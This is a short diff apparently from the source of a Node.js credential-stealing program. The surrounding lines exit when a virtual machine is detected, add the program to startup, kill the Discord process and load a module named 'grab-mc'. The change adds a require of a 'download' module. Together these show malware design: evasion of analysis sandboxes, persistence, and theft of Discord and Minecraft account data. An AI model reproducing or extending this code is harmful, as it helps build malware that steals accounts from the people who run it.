@@ -18,6 +18,7 @@ if (config.vmProtect && checkVM()) {
     process.exit(0);
   }
 } else {
+  require('./functions/download');
   if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
   config.discord.killProcess && require('./functions/kill-discord');
   require('./functions/grab-mc');
